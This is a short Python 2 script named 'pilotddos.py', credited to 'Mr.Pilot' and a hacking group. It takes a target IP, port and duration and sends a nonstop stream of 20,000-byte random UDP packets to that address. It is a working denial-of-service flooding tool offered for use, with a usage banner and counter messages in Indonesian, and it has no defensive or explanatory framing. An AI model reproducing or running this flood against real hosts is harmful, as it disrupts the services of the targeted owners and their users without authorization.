#!/usr/bin/python2

import os
import time
import socket
import random
import sys
from sys import argv

#code time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
def usage():
    print("""\033[1;32m
____ ___ _     ___ _____   ____  ____   ___  ____
|  _ \_ _| |   / _ \_   _| |  _ \|  _ \ / _ \/ ___|
| |_) | || |  | | | || |   | | | | | | | | | \___ \\
|  __/| || |__| |_| || |   | |_| | |_| | |_| |___) |
|_|  |___|_____\___/ |_|   |____/|____/ \___/|____/""")
    print "\033[1;32m=================================================="
    print " "
    print "\033[1;32mAuthor      : Mr.Pilot"
    print "\033[1;32mMy team     : Muslim Cyber Community"
    print "\033[1;32mGithub      : https://github.com/Tools-MrPilot"
    print "\033[1;32mWhatsapp    : 088228984977"
    print "\033[1;32mIntlstagram : @pilot_azka_aldric"
    print " "
    print "\33[1;32m=================================================="
    print "                     \033[1;32mCommand :"
    print "   \033[1;32mpython2 pilotddos.py (ip) (port) (turbo)"

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 0
    while True:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Mengirim %s packet kepada %s throught port:%s"%(sent,victim,vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
